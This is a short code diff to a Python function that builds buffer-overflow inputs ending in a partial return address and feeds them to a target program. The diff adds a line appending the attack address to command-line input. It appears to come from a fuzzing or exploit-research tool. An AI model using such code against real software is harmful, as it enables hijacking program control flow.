@@ -176,6 +176,7 @@ def attack_with_partial_address(len_to_reach_return_addr, partial_address, mask,
             file.write(inp)
             file.write(attack_address)
             file.close()
+        
         if detailed_log:
             print("NOW WE ATTACK ",i)
             print("This is our weapon ", fuzz_file)
@@ -185,6 +186,7 @@ def attack_with_partial_address(len_to_reach_return_addr, partial_address, mask,
             if input_from_file:
                 output = subprocess.run([fuzzed_program, fuzz_file], capture_output=True, text=True, shell=False, check=True, errors='ignore')
             else:
+                inp=inp+attack_address
                 output = subprocess.run([fuzzed_program, inp], capture_output=True, text=True, shell=False, check=True, errors='ignore')
             if detailed_log:
                 print(output)
